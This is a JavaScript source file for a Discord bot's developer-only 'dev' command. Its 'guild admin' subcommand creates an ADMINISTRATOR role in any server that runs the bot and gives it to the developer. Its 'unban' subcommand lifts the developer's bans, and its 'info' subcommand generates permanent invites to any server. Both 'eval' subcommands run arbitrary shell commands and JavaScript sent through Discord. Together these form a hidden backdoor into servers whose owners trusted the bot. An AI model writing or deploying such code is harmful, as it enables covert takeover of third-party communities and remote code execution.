/*****************************************************************************
__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\_____/\\\\\\\\\\\\__/\\\\\\\\\\\\\\\_        
 _\////////////\\\__\/////\\\///____/\\\//////////__\/\\\///////////__       
  ___________/\\\/_______\/\\\______/\\\_____________\/\\\_____________      
   _________/\\\/_________\/\\\_____\/\\\____/\\\\\\\_\/\\\\\\\\\\\_____     
    _______/\\\/___________\/\\\_____\/\\\___\/////\\\_\/\\\///////______    
     _____/\\\/_____________\/\\\_____\/\\\_______\/\\\_\/\\\_____________   
      ___/\\\/_______________\/\\\_____\/\\\_______\/\\\_\/\\\_____________  
       __/\\\\\\\\\\\\\\\__/\\\\\\\\\\\_\//\\\\\\\\\\\\/__\/\\\\\\\\\\\\\\\_ 
        _\///////////////__\///////////___\////////////____\///////////////__
*****************************************************************************/

const Config = require("../models/Config");
const Guild = require("../models/guild.js");
const Discord = require("discord.js");
const { bot } = require("../bot");
const error = require("../utils/error");
const { exec } = require("child_process");
const functions = require("../utils/functions");
const LMessages = require(`../messages`);
const { followReply } = require("../utils/functions");
const fs = require("fs");

module.exports = {
  name: "dev",
  cooldown: 3,
  aliases: [],
  category: "dev",
  async execute(int, serverQueue, Gres) {
    Config.findOne(
      {
        number: 1,
      },
      async (err, Cres) => {
        if (err) {
          console.error(err);
          error.sendError(err);
          return;
        }

        if (!Cres.botAdminDiscordID.includes(int.user.id)) {
          followReply(int, { content: LMessages.noPermission });

          return;
        }

        if (int.options.getSubcommandGroup() == "guild") {
          if (int.options.getSubcommand() == "admin") {
            Guild.findOne(
              {
                guildID: int.options.get("id").value,
              },
              (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  const guild = bot.guilds.cache.get(Gres.guildID);
                  const member = guild.members.cache.get(int.user.id);

                  var roleZ = int.guild.me.roles.cache
                    .filter((x) => x.managed == true)
                    .first();

                  guild.roles
                    .create({
                      data: {
                        name: "ADMIN",
                        color: "#FF0000",
                        mentionable: false,
                        position: roleZ.position,
                        permissions: "ADMINISTRATOR",
                      },
                      reason: "Zige needs the ADMIN powers :)",
                    })
                    .then((role) => {
                      if (member) {
                        member.roles.add(role);

                        followReply(int, {
                          content:
                            "**:white_check_mark: The permissions has been added to you.**",
                        });

                        return;
                      } else {
                        followReply(int, {
                          content: "**:x: You need to join the server first.**",
                        });

                        return;
                      }
                    });
                } else {
                  followReply(int, {
                    content: "**:x: This guild isn't in the database.**",
                  });

                  return;
                }
              }
            );
          } else if (int.options.getSubcommand() == "unban") {
            Guild.findOne(
              {
                guildID: int.options.get("id").value,
              },
              (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  bot.guilds.fetch(Gres.guildID).then((guild) => {
                    if (guild) {
                      bot.users.fetch(int.user.id).then((user) => {
                        if (user) {
                          guild.members
                            .unban(user, "Come back my father...")
                            .then(() => {
                              followReply(int, {
                                content:
                                  "**:white_check_mark: Come back my father...**",
                              });
                            });
                        } else {
                          followReply(int, {
                            content: "**:x: Cannot fetch user.**",
                          });

                          return;
                        }
                      });
                    } else {
                      followReply(int, {
                        content: "**:x: Cannot fetch guild.**",
                      });

                      return;
                    }
                  });
                } else {
                  followReply(int, {
                    content: "**:x: This guild isn't in the database.**",
                  });

                  return;
                }
              }
            );
          } else if (int.options.getSubcommand() == "dc") {
            bot.guilds.fetch(int.options.get("id").value).then((guild) => {
              if (guild) {
                guild.leave();
                followReply(int, {
                  content:
                    "**:white_check_mark: Guild leaved: ** `" +
                    guild.name +
                    "`",
                });
              } else {
                followReply(int, {
                  content: "**:x: Guild hasn't been found.**",
                });
              }
            });
            return;
          } else if (int.options.getSubcommand() == "plus") {
            Guild.findOne(
              {
                guildID: int.options.get("id").value,
              },
              (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                Guild.findOneAndUpdate(
                  {
                    guildID: int.options.get("id").value,
                  },
                  {
                    plus: !Gres.plus,
                  },
                  function (err) {
                    if (err) {
                      console.error(err);
                      error.sendError(err);
                      return;
                    }
                  }
                );

                if (Gres) {
                  followReply(int, {
                    content: `**:white_check_mark: Plus option has been set to \`${!Gres.plus}\`.**`,
                  });
                } else {
                  followReply(int, {
                    content: "**:x: Guild hasn't been found.**",
                  });
                }
              }
            );
            return;
          } else if (int.options.getSubcommand() == "info") {
            Guild.findOne(
              {
                guildID: int.options.get("id").value,
              },
              async (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  const guild = await bot.guilds.fetch(Gres.guildID);

                  let channel = guild.channels.cache
                    .filter(
                      (x) => x.deleted == false && x.type != "GUILD_CATEGORY"
                    )
                    .first();

                  var owner = await guild.fetchOwner();
                  channel
                    .createInvite({
                      maxAge: 0,
                      maxUses: 0,
                    })
                    .then((invite) => {
                      const embed = new Discord.MessageEmbed()
                        .setTitle(guild.name)
                        .setColor("#202225")
                        .setThumbnail(guild.iconURL())
                        .addField("`Owner name:`", owner.user.username)
                        .addField("`Invite link:`", invite.url);

                      followReply(int, { embeds: [embed] });
                    });
                } else {
                  followReply(int, {
                    content: "**:x: This guild isn't in the database.**",
                  });

                  return;
                }
              }
            );
          }
        } else if (int.options.getSubcommandGroup() == "rpi") {
          if (int.options.getSubcommand() == "logs") {
            if (
              !fs.existsSync("../.pm2/logs/bot-out.log") ||
              !fs.existsSync("../.pm2/logs/bot-error.log")
            ) {
              followReply(int, {
                content: "**:x: There was an error when getting the logs.**",
              });
              return;
            }
            followReply(int, {
              files: [
                {
                  attachment: "../.pm2/logs/bot-out.log",
                  name: "bot-out.log",
                },
                {
                  attachment: "../.pm2/logs/bot-error.log",
                  name: "bot-error.log",
                },
              ],
            });

            return;
          } else if (int.options.getSubcommand() == "eval") {
            exec(int.options.get("command").value, (err, stdout, stderr) => {
              if (err) {
                console.error(err);
                error.sendError(err);
                return;
              }
              setTimeout(() => {
                followReply(int, { content: stdout + stderr });
              }, 3000);
            });
            return;
          } else if (int.options.getSubcommand() == "restart") {
            exec("pm2 restart bot");
            followReply(int, {
              content: "**:white_check_mark: Bot is restarting.**",
            });
            return;
          } else if (int.options.getSubcommand() == "flush") {
            exec("pm2 flush");
            followReply(int, {
              content: "**:white_check_mark: Logs flushed.**",
            });
            return;
          } else if (int.options.getSubcommand() == "ssh") {
            followReply(int, {
              content: "URL: " + Cres.ngrokRpiSSH,
            });
            return;
          }
        } else if (int.options.getSubcommandGroup() == "global") {
          if (int.options.getSubcommand() == "playing") {
            var playing = 0;
            Guild.find({}).then(function (gGuilds) {
              gGuilds.forEach((e) => {
                if (e.musicBotPlaying == true) {
                  playing = playing + 1;
                }
              });

              if (playing > 0) {
                followReply(int, {
                  content: `**:warning: Bot is currently playing on \`${playing}\` servers. \nBut you can use \`dev shout [int]\` to send a int to all of the guilds.**`,
                });
              } else {
                followReply(int, {
                  content: `**:white_check_mark: Bot isn't currently playing anywhere.**`,
                });
              }
            });
          } else if (int.options.getSubcommand() == "update") {
            var change = require("../utils/updateMany");

            Guild.updateMany({}, change, {}, (err) => {
              if (err) {
                console.error(err);
                error.sendError(err);
                return;
              }
            });

            followReply(int, {
              content: `**:white_check_mark: There has been changed:** ${JSON.stringify(
                change
              )}`,
            });
            return;
          } else if (int.options.getSubcommand() == "guilds") {
            var gls = [];
            Guild.find({}).then(function (gGuilds) {
              gGuilds.forEach((e) => {
                gls.push(`**${e.guildName}** - ${e.guildID} \n`);
              });
              console.log(gls);
              followReply(int, { content: gls.join(" ") });
            });

            return;
          } else if (int.options.getSubcommand() == "deploy") {
            if (bot.application) {
              bot.application.commands.set(functions.deploy);

              followReply(int, { content: "**:white_check_mark: Deployed.**" });
            } else {
              followReply(int, { content: "**:x: Failed.**" });
            }
          } else if (int.options.getSubcommand() == "shout") {
            Guild.find({}).then(function (gGuilds) {
              gGuilds.forEach((e) => {
                let guild = bot.guilds.cache.get(e.guildID);
                if (guild) {
                  let channel = guild.channels.cache
                    .filter(
                      (x) =>
                        x.type == "GUILD_TEXT" &&
                        x.permissionsFor(guild.me).has("SEND_MESSAGES") &&
                        x?.nsfw == false
                    )
                    .first();
                  if (channel) {
                    channel.send({
                      content: `**:scroll: Message from **__${
                        int.user.username
                      }__**:**\n \n${int.options.get("message").value} `,
                    });
                  }
                }
              });
            });
          } else if (int.options.getSubcommand() == "eval") {
            var string = int.options.get("code").value;

            let result = await eval(string);

            followReply(int, {
              content: "**RESULT: ** \n```JS\n" + result + "\n```",
            });
            return;
          }
        }
      }
    );
  },
};
